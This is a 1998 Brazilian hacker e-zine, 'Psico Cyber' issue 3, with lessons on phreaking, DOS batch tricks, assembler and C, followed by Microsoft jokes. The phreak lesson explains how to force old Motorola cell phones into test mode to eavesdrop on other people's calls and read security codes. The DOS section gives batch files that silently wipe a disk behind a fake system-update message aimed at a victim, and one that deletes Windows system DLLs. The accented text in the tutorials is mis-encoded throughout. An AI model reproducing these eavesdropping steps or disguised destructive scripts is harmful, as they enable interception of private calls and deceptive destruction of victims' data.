@@ -1,0 +1,643 @@
+Feito integralmente por Na_Ideia !
+ano 01  numero 03 - setembro de 1998 !
+
+    pppppppppp   sssssssssss   ii   cccccccccc     oooooooooooo
+     pp       p   ss            ii   cc             oo        oo
+      pp       p   ss            ii   cc             oo        oo
+       pp       p   ss            ii   cc             oo        oo
+        pppppppppp   sssssssssss   ii   cc             oo        oo
+         pp                    ss   ii   cc             oo        oo
+          pp                    ss   ii   cc             oo        oo
+           pp                    ss   ii   cc             oo        oo
+            pp                    ss   ii   cc             oo        oo
+             pp           sssssssssss   ii   ccccccccccc    oooooooooooo
+                                                                   CYBER
+
+        pode ser downloadeado de http://www.angelfire.com/id/psicocyber
+
+              MELHOR SE ABERTO NO EDIT DO DOS OU ALGO PARECIDO
+                          (editor de txt)
+
+****************************************************************************
+* ESTE ZINE TEM COMO OBJETIVO A INFORMACAO, POR ISSO NAO ME RESPONSABILIZO *
+* POR QUALQUER ATO IRRESPONSAVEL E/OU IMBECIL FEITO POR QUEM LER ESSE ZINE *
+* TAMBEM NEM RECOMENDO A PRATICA DE ATOS ILEGAIS AQUI CONTIDOS !!          *
+****************************************************************************
+
+                      Alerta
+
+            Se o que vc procura e soh codigo de ViRuS ou apenas dicazinhas
+            de invadir sistemas alheios veio ao zine errado !!
+            Aqui vc ira fazer minicursos que irao lhe proporcionar
+            um entendimento melhor da BANANA !!!!!!!
+
+ Indice :
+         Phreak    aula 3/?
+         SO
+         Assembler aula 2/?
+         C         aula 1/?
+         AbOrTi rEtRiEi fAiO !
+
+ @#@#@#@#@#@##@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@##@#@#@###@#@#@#@#@#@#@#@
+
+                       PHREAK    aula 3
+
+    Nessa aula entraremos no topico - CELULARES, que eh hoje em dia
+      um enorme campo para o phreaker, pode-se ouvir outras conversas,
+      pode-se clonar linhas, ligar sem pagar , etc..
+
+    O celular nada mais eh que um radio transmisor que opera na faixa
+      dos 800 Mhz (isso na geral, pois eles podem ser programados para
+      operar em outras frequencias tambem). A Partir desta teoria per-
+      cebe-se entao que o celular nao eh uma invencao do sec. 21 como
+      dizem, eh apenas um radio transmisor melhorado, com novas funcoes
+      e programavel.
+
+                  Ouvindo conversas alheias
+
+   Para ouvir outras conversas eh muito simples, primeiro vc tera que
+     saber como eh que ativa o "test mode" do celular.
+
+  Isso nao eh valido para os modelos mais novos como os da linha Elite,
+  StarTec, entre outros. Para saber, retire a bateria e observe se a
+  3 pinos (positivo, negativo e o test mode), se houver esse 3 pinos eh
+  que esse esquema funciona! A maioria dos MOTOROLA "veio de guerra" da.
+
+  Retire a bateria e observe que ha 3 pinos (como dito acima).
+  O primeiro pino serve para o polo positivo da bateria.
+  O segundo (mais afundado) eh o test mode (veja que este nao tem contato
+    com a bateria.
+  E o terceiro obviamente e o polo negativo.
+
+  Vc pega entao algo que transmita eletricidade para fazer o contato
+   da bateria e o pino do "test mode" (um pedaco de papel alumunio
+   serve), coloca-se entao o aluminio no pino do meio de modo que este
+   escoste na bateria do celular ao recoloca-la. Ligue-o .
+  Se ficar aparecendo um monte de numero loko eh que o esquema deu certo
+   se nao retire a bateria e ajeite ou coloque mais papel aluminio.
+
+  Dentro do "test mode" aperte "#" para ativar a recepcao de comandos.
+  Ira aparecer na tela a msg "  U5  '" - isto mostra que a recepcao
+    de comandos esta OK.
+
+  Digite: 08 #  ---- escuta-se entao o ruido caracteristico de radio
+    transmicao.
+  Digite: 11???? # ---- os 4 numeros seguidos do "11" eh da sua
+    escolha, se a chiadera continuar, troque os 4 ultimos numeros,
+    fique chutando ate encontrar um canal que esteja sendo usado.
+
+  O comando "01" reseta o "test mode".
+
+                 Os comandos sempre sao acrecidos de "#" !!
+
+  Vendo e/ou mudando a senha de seguranca e senha de acesso (lock)
+
+   Entre no "test mode";
+   Ative a recepcao de comandos;
+   Entre com o comando "55"
+   A setima funcao eh a senha de seguranca (eh essa senha que o cara da
+     companhia telefonica usa para abilitar o fone) 6 digitos;
+   A oitava eh a senha de acesso (lock) tem 3 digitos.
+
+  +=-+=-=+=-=+=-=+=-=+=-=+=-=+=-=+=-=+=-=+=-=+=-=+=-=+=-=+=-=+=-=+=-=+
+
+                              SO
+
+     A secao de SO saiu miada pois no psicocyber 04 ta a secao completa !
+
+                     Uso do "null" em bath files
+
+   Para nao aparecer que esta apagando no "deltree /y *.*" acrecente
+    " > null" logo apos o comando.
+
+   Ele ira apagar tudo sem mostrar nada, e no final cria um arquivo
+     de log chamado "null" com o texto da apagacao !
+
+   Ou use o esquema abaixo mandado pelo leitor Kov !
+
+@echo off
+echo.
+echo.
+echo O MS-DOS detectou novas configuracoes que deverao ser atualizadas.
+echo Aguarde...
+echo.
+echo.
+cd\
+deltree /y *.* >nul
+
+Os comandos acima vao mostrar uma mensagem para que o lammer naum se as_
+suste com a leitura exceciva do disco e o >nul naum vai deixar o deltree
+mostrar nada na tela.
+
+No bat que deleta os DLLs e SYSs do windos eu discordo do comando:
+cd\windows\system.
+Pois naum saum todos os usuarios que tem o windows nesse diretorio.
+Assim podemos usar uma variavel do sistema, a %windir% desse jeito:
+@echo off
+cd\%windir%\system
+attrib *.dll -h -r -s
+del *.dll
+                                                       By Kov!!
+
+ Valeu pelo mail Kov !!
+
+ Se vc tiver algo interecante sobre algum assunto mencionado no zine, ou
+  discorda de algo, mande um mail que ele sera publicado com seus devidos
+  creditos !!
+
+----------------------------------------------------------------------
+
+                        ASSEMBLER aula 02
+
+2.2.CONCEITOS BµSICOS
+
+Conte£do:
+
+2.2.1.Informa‡äes nos computadores
+2.2.2.M‚todos de representa‡Æo de dados
+
+2.2.1.Informa‡Æo no computador:
+
+	2.2.1.1.Unidades de informa‡Æo
+	2.2.1.2.Sistemas num‚ricos
+	2.2.1.3.Convertendo n£meros bin rios para decimais
+	2.2.1.4.Convertendo n£meros decimais para bin rios
+	2.2.1.5.Sistema hexadecimal
+
+2.2.1.1.Unidades de informa‡Æo
+
+Para o PC processar a informa‡Æo, ‚ necess rio que ela esteja em c‚lulas
+especiais, chamadas registradores.
+
+Os registradores sÆo grupos de 8 ou 16 flip-flops.
+
+Um flip-flop ‚ um dispositivo capaz de armazenar 2 n¡veis de voltagem, um
+baixo, geralmente 0.5 volts, e outro comumente de 5 volts. O n¡vel baixo de
+energia no flip-flop ‚ interpretado como desligado ou 0, e o n¡vel alto,
+como ligado ou 1. Estes estados sÆo geralmente conhecidos como bits, que sÆo
+a menor unidade de informa‡Æo num computador.
+
+Um grupo de 16 bits ‚ conhecido como palavra; uma palavra pode ser dividida
+em grupos de 8 bits chamados bytes, e grupos de 4 bits chamados nibbles.
+
+2.2.1.2.Sistemas num‚ricos
+
+O sistema num‚rico que n¢s usamos diariamente ‚ o decimal, mas este sistema
+nÆo ‚ conveniente para m quinas, pois ali as informa‡äes tˆm que ser
+codificadas de modo a interpretar os estados da corrente (ligado-desligado);
+este modo de c¢digo faz com que tenhamos que conhecer o c lculo posicional
+que nos permitir  expressar um n£mero em qualquer base onde precisarmos
+dele.
+
+ poss¡vel representar um determinado n£mero em qualquer base atrav‚s da
+seguinte f¢rmula:
+
+Onde n ‚ a posi‡Æo do d¡gito, iniciando da direita para a esquerda e
+numerando de 0. D ‚ o d¡gito sobre o qual n¢s operamos e B ‚ a base num‚rica
+usada.
+
+2.2.1.3.Convertendo n£meros bin rios para decimais
+
+Quando trabalhamos com a Linguagem Assembly encontramos por acaso a
+necessidade de converter n£meros de um sistema bin rio, que ‚ usado em
+computadores, para o sistema decimal usado pelas pessoas.
+
+O sistema bin rio ‚ baseado em apenas duas condi‡äes ou estados, estar
+ligado(1), ou desligado(0), portanto sua base ‚ dois.
+
+Para a conversÆo, podemos usar a f¢rmula de valor posicional:
+
+Por exemplo, se tivermos o n£mero bin rio 10011, tomamos cada d¡gito da
+direita para a esquerda e o multiplicamos pela base, elevando … potˆncia
+correspondente … sua posi‡Æo relativa:
+
+Binary:         1         1       0       0       1
+
+Decimal:       1*2^0  + 1*2^1 + 0*2^2 + 0*2^3 + 1*2^4
+
+            =   1     +   2   +   0   +   0   +  16  = 19 decimal.
+
+O caracter ^ ‚ usado em computa‡Æo como s¡mbolo para potˆncia e * para a
+multiplica‡Æo.
+
+2.2.1.4.Convertendo n£meros decimais para bin rio
+
+H  v rios m‚todos para se converter n£meros decimais para bin rio; apenas um
+ser  analizado aqui. Naturalmente a conversÆo com uma calculadora cient¡fica
+‚ muito mais f cil, mas nem sempre podemos contar com isso, logo o mais
+conveniente ‚, ao menos, sabermos uma f¢rmula para fazˆ-la.
+
+O m‚todo resume-se na aplica‡Æo de divisäes sucessivas por 2, mantendo o
+resto como o d¡gito bin rio e o resultado como o pr¢ximo n£mero a ser
+dividido.
+
+Tomemos como exemplo o n£mero decimal 43.
+
+43/2=21 e o resto ‚ 1; 21/2=10 e o resto ‚ 1; 10/2=5 e o resto ‚ 0;
+5/2=2 e o resto ‚ 1; 2/2=1 e o resto ‚ 0; 1/2=0 e o resto ‚ 1.
+
+Para construir o equivalente bin rio de 43, vamos pegar os restos obtidos de
+baixo para cima, assim temos 101011.
+
+2.2.1.5.Sistema hexadecimal
+
+Na base hexadecimal temos 16 d¡gitos, que vÆo de 0 a 9 e da letra A at‚ a F,
+estas letras representam os n£meros de 10 a 15. Portanto contamos:
+0,1,2,3,4,5,6,7,8,9,A,B,C,D,E, e F.
+
+A conversÆo entre n£meros bin rios e hexadecimais ‚ f cil. A primeira coisa
+a fazer ‚ dividir o n£mero bin rio em grupos de 4 bits, come‡ando da direita
+para a esquerda. Se no grupo mais … direita sobrarem d¡gitos, completamos
+com zeros.
+
+Tomando como exemplo o n£mero bin rio 101011, vamos dividi-lo em grupos de 4
+bits:
+
+10;1011
+
+Preenchendo o £ltimo grupo com zeros (o um mais … esquerda):
+
+0010;1011
+
+A seguir, tomamos cada grupo como um n£mero independente e consideramos o
+seu valor decimal:
+
+0010=2;1011=11
+
+Entretanto, observa-se que nÆo podemos representar este n£mero como 211,
+isto seria um erro, uma vez que os n£meros em hexa maiores que 9 e menores
+que 16 sÆo representados pelas letras A,B,...,F. Logo, obtemos como
+resultado:
+
+2Bh, onde o "h" representa a base hexadecimal.
+
+Para a conversÆo de um n£mero hexadecimal em bin rio ‚ apenas necess rio
+inverter os passos: tomamos o primeiro d¡gito hexadecimal e o convertemos
+para bin rio, a seguir o segundo, e assim por diante.
+
+                        ... ate o proximo, estudem bem isso, pois vai
+                        comecar a complicar !!
+
+ ------- \\ ---------------------------------------- // ---------------
+
+                     LINGUAGEM C  aula 01
+
+        Inicia aqui o mini-curso de Linguagem C !!
+
+1. Fundamentos da Linguagem C
+
+        Neste capitulo serÆo vistos os fundamentos da linguagem C. O
+   conceito de linguagem de programa‡Æo, linguagens de alto e baixo n¡vel,
+   linguagens gen‚ricas e especificas. Ser  visto um pouco do hist¢rico
+   da cria‡Æo da linguagem e a descri‡Æo das caracter¡sticas mais
+   importantes da linguagem C.Finalmente, ser  visto o aspecto geral
+   de um c¢digo fonte escrito em C.
+
+	1.1	Linguagens de Programa‡Æo
+
+	Um programa de computador ‚ um conjunto instru‡äes que representam
+    um algoritmo para a resolu‡Æo de algum problema. Estas instru‡äes sÆo
+    escritas atrav‚s de um conjunto de c¢digos (s¡mbolos e palavras).
+    Este conjunto de c¢digos possui regras de estrutura‡Æo l¢gica e
+    sint tica pr¢pria. Dizemos que este conjunto de s¡mbolos e regras
+    formam uma linguagem de programa‡Æo.
+
+	1.1.1	Exemplos de c¢digos.
+
+	Existem muitas linguagens de programa‡Æo. Podemos escrever um
+     algoritmo para resolu‡Æo de um problema por interm‚dio de qualquer
+     linguagem. A seguir mostramos alguns exemplos de trechos de c¢digos
+     escritos em algumas linguagens de programa‡Æo.
+
+	Exemplo: trecho de um algoritmo escrito em Pseudo-linguagem que
+     recebe um n£mero num e escreve a tabuada de 1 a 10 para este valor:
+	leia num
+	para n de 1 at‚ 10 passo 1 fa‡a
+	  tab ? num * n
+	  imprime tab
+	fim fa‡a
+
+	Exemplo: trecho do mesmo programa escrito em linguagem C:
+	scanf(&num);
+	for(n = 1; n <= 10; n++){
+	  tab = num * n;
+	  printf("\n %d", tab);
+	};
+
+	Exemplo: trecho do mesmo programa escrito em linguagem Basic:
+	10 input num
+	20 for n = 1 to 10 step 1
+	30 let tab = num * n
+	40 print chr$ (tab)
+	50 next n
+
+	Exemplo: trecho do mesmo programa escrito em linguagem Fortran:
+	       read (num);
+	   do 1 n = 1:10
+	     tab = num * n
+	     write(tab)
+	10 continue
+
+	Exemplo: trecho do mesmo programa escrito em linguagem Assembly
+     para INTEL 8088:
+	MOV CX,0
+	IN  AX,PORTA
+	MOV DX,AX
+	LABEL:
+	INC CX
+	MOV AX,DX
+	MUL CX
+	OUT AX, PORTA
+	CMP CX,10
+	JNE LABEL
+
+	1.1.2	Linguagens de baixo e alto n¡vel.
+
+	Podemos dividir, genericamente, as linguagens de programa‡Æo em
+    dois grandes grupos: as linguagens de baixo n¡vel e as de alto n¡vel:
+
+	Linguagens de baixo n¡vel: SÆo linguagens voltadas para a m quina,
+    isto ‚, sÆo escritas usando as instru‡äes do microprocessador do
+    computador. SÆo genericamente chamadas de linguagens Assembly.
+
+	Vantagens: Programas sÆo executados com maior velocidade de
+    processamento. Os programas ocupam menos espa‡o na mem¢ria.
+
+	Desvantagens: Em geral, programas em Assembly tem pouca
+    portabilidade, isto ‚, um c¢digo gerado para um tipo de processador
+    nÆo serve para outro. C¢digos Assembly nÆo sÆo estruturados, tornando
+    a programa‡Æo mais dif¡cil.
+
+	Linguagens de alto n¡vel: SÆo linguagens voltadas para o ser
+    humano. Em geral utilizam sintaxe estruturada tornando seu c¢digo
+    mais leg¡vel. Necessitam de compiladores ou interpretadores para
+    gerar instru‡äes do microprocessador. Interpretadores fazem a
+    interpreta‡Æo de cada instru‡Æo do programa fonte executando-a dentro
+    de um ambiente de programa‡Æo, Basic e AutoLISP por exemplo.
+    Compiladores fazem a tradu‡Æo de todas as instru‡äes do programa
+    fonte gerando um programa execut vel. Estes programas execut veis
+    (*.exe) podem ser executados fora dos ambientes de programa‡Æo, C e
+    Pascal por exemplo. As linguagens de alto n¡vel podem se distinguir
+    quanto a sua aplica‡Æo em gen‚ricas como C, Pascal e Basic ou
+    espec¡ficas como Fortran (c lculo matem tico), GPSS (simula‡Æo),
+    LISP (inteligˆncia artificial) ou CLIPPER (banco de dados).
+
+	Vantagens: Por serem compiladas ou interpretadas, tem maior
+    portabilidade podendo ser executados em varias plataformas com
+    pouqu¡ssimas modifica‡äes. Em geral, a programa‡Æo torna-se mais
+    f cil por causa do maior ou menor grau de estrutura‡Æo de suas
+    linguagens.
+
+	Desvantagens: Em geral, as rotinas geradas (em linguagem de
+    maquina) sÆo mais gen‚ricas e portanto mais complexas e por isso
+    sÆo mais lentas e ocupam mais mem¢ria.
+
+	1.2	Linguagem C
+
+	A linguagem C ‚ uma linguagem de alto n¡vel, gen‚rica. Foi
+    desenvolvida por programadores para programadores tendo como meta
+    caracter¡sticas de flexibilidade e portabilidade. O C ‚ uma linguagem
+    que nasceu juntamente com o advento da teoria de linguagem estruturada
+    e do computador pessoal. Assim  tornou-se rapidamente uma linguagem
+    "popular" entre os programadores. O C foi usado para desenvolver o
+    sistema operacional UNIX, e hoje esta sendo usada para desenvolver
+    novas linguagens, entre elas a linguagem  C++ e Java.
+
+	1.2.1	Caracter¡sticas do C
+
+	Entre as principais caracter¡sticas do C, podemos citar:
+
+* O C ‚ uma linguagem de alto n¡vel com uma sintaxe bastante estruturada
+   e flex¡vel tornando sua programa‡Æo bastante simplificada.
+
+* Programas em C sÆo compilados, gerando programas execut veis.
+
+* O C compartilha recursos tanto de alto quanto de baixo n¡vel, pois
+   permite acesso e programa‡Æo direta do microprocessador. Com isto,
+   rotinas cuja dependˆncia do tempo ‚ cr¡tica, podem ser facilmente
+   implementadas usando instru‡äes em Assembly. Por esta razÆo o  C ‚
+   a linguagem preferida dos programadores de aplicativos.
+
+* O C ‚ uma linguagem estruturalmente simples e de grande portabilidade.
+   O compilador C gera c¢digos mais enxutos e velozes  do que muitas
+   outras linguagens.
+
+* Embora estruturalmente simples (poucas fun‡äes intr¡nsecas) o C nÆo
+   perde funcionalidade pois permite a inclusÆo de uma farta quantidade
+   de rotinas do usu rio. Os fabricantes de compiladores fornecem uma
+   ampla variedade de rotinas pr‚-compiladas em bibliotecas.
+
+	1.2.2	Hist¢rico
+
+1970:	Denis Ritchie desenha uma linguagem a partir do BCPL nos
+         laborat¢rios da Bell Telephones, Inc. Chama a linguagem de B.
+
+1978: 	Brian Kerningham junta-se a Ritchie para aprimorar a linguagem.
+         A nova versÆo chama-se C.
+	Pelas suas caracter¡sticas de portabilidade e estrutura‡Æo j
+         se torna popular entre os programadores.
+
+1980:   A linguagem ‚ padronizada pelo American National Standard
+         Institute: surge o ANSI C.
+
+1990:   A Borland International Co, fabricante de compiladores profissionais
+        escolhe o C e o Pascal como linguagens de trabalho para o seu
+        Integrated Development Enviroment (Ambiente Integrado de
+        Desenvolvimento): surge o Turbo C.
+
+1992:   O C se torna ponto de concordƒncia entre te¢ricos do desenvolvimento
+         da teoria de Object Oriented Programming (programa‡Æo orientada a
+         objetos): surge o C++.
+
+	1.3	Estrutura de um programa em C
+
+	Um programa em C ‚ constitu¡do de:
+
+* um cabe‡alho contendo as diretivas de compilador onde se definem o valor
+   de constantes simb¢licas, declara‡Æo de vari veis, inclusÆo de
+   bibliotecas, declara‡Æo de rotinas, etc.
+
+* um bloco de instru‡äes principal e outros blocos de rotinas.
+
+* documenta‡Æo do programa: coment rios.
+
+	Programa Exemplo: O arquivo e0101.cpp  cont‚m um programa para
+         calcular a raiz quadrada de um n£mero real positivo:
+
+	1.3.1 	Conjunto de caracteres
+
+	Um programa fonte em C ‚ um texto nÆo formatado escrito em um
+         editor de textos usando um o conjunto padrÆo de caracteres ASCII.
+         A seguir estÆo os caracteres utilizados em C:
+
+	Caracteres v lidos:
+	a b c d e f g h i j k l m n o p q r s t u v w x y z
+	A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
+	1 2 3 4 5 6 7 8 9 0
+ 	+ - * / \ = | & ! ? # % ( ) { } [ ] _ ' " . , : < >
+
+	Caracteres nÆo v lidos:
+	@ $ ù   ‚ ä ‡
+
+	Os caracteres acima sÆo v lidos apenas em strings. Veja se‡Æo 2.1.4.
+
+	1.3.2	Coment rios
+
+	Em C, coment rios podem ser escritos em qualquer lugar do texto
+         para facilitar a interpreta‡Æo do algoritmo. Para que o coment rio
+         seja identificado como tal, ele deve ter um /* antes e um */
+         depois.
+
+   Observe que no exemplo e0101.cpp todo o cabe‡alho esta dentro de um
+    coment rio.
+
+	Exemplo:
+	/* esta eï uma linha de coment rio em C */
+
+	Observa‡Æo: O C++ permite que coment rios sejam escritos de outra
+         forma: colocando um // em uma linha, o compilador entender  que
+         tudo que estiver a direita do s¡mbolo ‚ um coment rio.
+
+   Observe no programa exemplo e0101.cpp as linhas de coment rios colocadas
+    a direita dos comandos.
+
+	Exemplo:
+	// este eï um coment rio valido apenas em C++
+
+	1.3.3 	Diretivas de Compila‡Æo
+
+     Em C, existem comandos que sÆo processados durante a compila‡Æo do
+      programa. Estes comandos sÆo genericamente chamados de diretivas
+      de compila‡Æo. Estes comandos informam ao compilador do C
+      basicamente quais sÆo as constantes simb¢licas usadas no programa
+      e quais bibliotecas devem ser anexadas ao programa execut vel.
+      A diretiva #include diz ao compilador para incluir na compila‡Æo
+      do programa outros arquivos. Geralmente estes arquivos contem
+      bibliotecas de fun‡äes ou rotinas do usu rio. Voltaremos a
+      trabalhas esta diretiva com mais detalhe no cap¡tulo 5. A diretiva
+      #define diz ao compilador quais sÆo as constantes simb¢licas
+      usadas no programa. Veremos sobre esta diretiva no capitulo 2.
+
+	1.3.4 	Declara‡Æo de vari veis
+
+       Em C, como na maioria das linguagens, as vari veis devem ser
+        declaradas no inicio do programa.
+      Estas vari veis podem ser de v rios tipos: int (inteiro), float
+       (real de simples precisÆo) e outras que serÆo vistas no capitulo
+       2. No exemplo acima num, raiz, inf e sup sÆo declaradas como
+       vari veis reais, enquanto i ‚ declarada como uma vari vel inteira.
+
+	1.3.5 	Entrada e sa¡da de dados
+
+      Em C existem varias maneiras de fazer a leitura e escrita de
+       informa‡äes. Estas opera‡äes sÆo chamadas de opera‡äes de entrada
+       e sadia. Veremos no capitulo 3 algumas fun‡äes de entrada e sadia de
+       informa‡äes via teclado e tela. Outras fun‡äes de leitura e escrita
+       em arquivos, sadia gr fica, fun‡äes de manipula‡Æo de mouse, entrada
+       e sadia de informa‡äes via portas serial e paralela serÆo vistas
+       em cap¡tulos posteriores. No exemplo acima printf ‚ uma fun‡Æo de
+       escrita na tela, scanf ‚ uma fun‡Æo de leitura de teclado.
+
+	1.3.6 	Estruturas de controle
+
+       A linguagem C permite uma ampla variedade de estruturas de controle
+        de fluxo de processamento. Estas estruturas serÆo vistas em
+        detalhes nos cap¡tulos 4 e 5. Duas estruturas das estruturas
+        b sicas (decisÆo e repeti‡Æo) sÆo muito semelhantes as estruturas
+        usadas nas Pseudo-linguagem algor¡tmicas:
+
+	Estrutura de DecisÆo: Permite direcionar o fluxo l¢gico para dois
+         blocos distintos de instru‡äes conforme uma condi‡Æo de controle.
+
+	Pseudo-linguagem                     Linguagem C
+
+	se condi‡Æo                          if(condi‡Æo){
+	  entÆo bloco 1                        bloco 1;
+	  senÆo bloco 2                      }else{
+	fim se                                 bloco 2;
+                                          };
+	Estrutura de Repeti‡Æo: Permite executar repetidamente um bloco
+         de instru‡äes ate que uma condi‡Æo de controle seja satisfeita.
+
+	Pseudo-linguagem                     Linguagem C
+
+	fa‡a                                 do{
+	  bloco                                bloco;
+	at‚ condi‡Æo                      	}while(condi‡Æo);
+
+                                 ... mais C no proximo !!
+
+<>><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+
+               /-----------------------------\
+               |   AbOrTi   rEtRiEi   fAiO   |
+               \-----------------------------/
+
+SE A MICROSOFT FABRICASSE CARROS...
+
+1. Toda vez que eles repintassem as linhas da estrada vocˆ teria que comprar
+  um carro novo.
+2. Ocasionalmente seu carro morreria na auto-estrada sem nenhuma  razÆo
+  aparente, e vocˆ teria apenas que aceitar isso, religa-lo e seguir adiante.
+3. Ocasionalmente, a execu‡Æo de uma manobra faria com que seu carro parasse
+  e falhasse e vocˆ teria que reinstalar o motor. Por alguma estranha razÆo,
+  vocˆ aceitaria isso tambem.
+4. Vocˆ poderia ter apenas uma pessoa dentro do carro de cada vez,  a menos
+  que vocˆ comprasse o "Carro95" ou o "CarroNT". Mas, depois vocˆ ainda teria que
+  comprar mais assentos.
+5. A Macintosh faria um carro que seria movido a energia solar, confi vel,
+  cinco vezes mais r pido e duas vezes mais f cil de dirigir  - mas, apenas
+  poderia rodar em 5 porcento das estradas.
+6. Os propriet rios de carros Macintosh poderiam conseguir car¡ssimos
+  "upgrades" para carros Microsoft, o que faria seus carros rodarem  muito
+  mais lentamente.
+7. Os indicadores luminosos de falta de ¢leo, gasolina e bateria seriam
+  substitu¡dos por um simples "Indicador luminoso geral" (aqui ‚ feita uma
+  ironia ao famoso "General protection fault" do Windows, onde ‚  dito que
+  o indicador chamaria-se "General car fault").
+8. Os novos assentos obrigariam todos a terem o mesmo tamanho de bunda.
+9. O sistema de "airbag" perguntaria "Vocˆ tem certeza ?" (Are you sure ?)
+  antes de entrar em a‡Æo.
+10.Se vocˆ se envolvesse numa colisÆo, vocˆ nÆo teria a menor id‚ia  do que
+  aconteceria depois.
+
+E se Bill Gates fabricasse o Viagra?
+
+1. Provavelmente, o MSViagra ainda estaria em testes...nÆo teria sido
+  lan‡ado!
+2. Na bula vem um cupom para um futuro upgrade para o MSViagra 2...
+3. O usuario teria uma ere‡Æo, mas ele misteriosamente terminaria no
+  meio do ato por motivo inexplicado...
+4. O usuario teria a ere‡Æo, mas descobriria aterrorizado que ela nÆo
+  poderia proporcionar a ele um orgasmo...s¢ a partir da versÆo MSViagra
+  2...mas o fabricante promete um patch no formato de uma pequena pilula
+  amarela para tomar durante o ato...
+5. Vocˆ toma a pilula, ela nÆo funciona e vocˆ liga para o laborat¢rio
+  para reclamar. O laborat¢rio entÆo lhe convence que vocˆ nÆo esta tomando a
+  p¡lula direito, ou com muita  gua, ou com pouca  gua, ou sem  gua
+  nenhuma, mas sempre a op‡Æo que voce NÇO deu...
+6. Vocˆ compra o MSViagra, mas junto ao pacote vem um vidrinho de
+  vitamina C com um gosto horr¡vel. E o MSViagra s¢ funciona se voce tomar essa
+  maldita vitamina...
+7. Quando vocˆ toma o MSViagra, v rios efeitos colaterais surgem: dores
+  de cabe‡a, ausencia de sentidos, como olfato e paladar e outras coisas. Mas
+  tudo isso ‚ apenas um detalhe, perto do imenso prazer que o MSViagra
+  vai lhe proporcionar...
+8. Depois de instalada a ere‡Æo, vocˆ descobre que nÆo consegue
+  desinstal -la...
+9. Vocˆ descobrir  que so sente atra‡Æo por determinadas mulheres: as
+  fabricadas pela Microsoft.
+10. Junto com o MSViagra, vocˆ receber  um pacote de inumeros remedios
+  para doen‡as que vocˆ nÆo possui...
+11. NÆo vir  escrito em lugar nenhum, mas se vocˆ reparar bem, na
+  verdade nÆo tera uma ere‡Æo real. Apenas foi convencido de que tem, o que,
+  no fundo no fundo, ‚ a mesma coisa...
+
+   Contribue com o zine, mande piadas da Microsoft ou do Bill Gates !!
+
+                      -------\/\/\/\/\--------
+
+    HP   -   www.angelfire.com/id/psicocyber
+    E-Mail - naideia@yahoo.com
+
+     /\/ /\   | |] { | /\
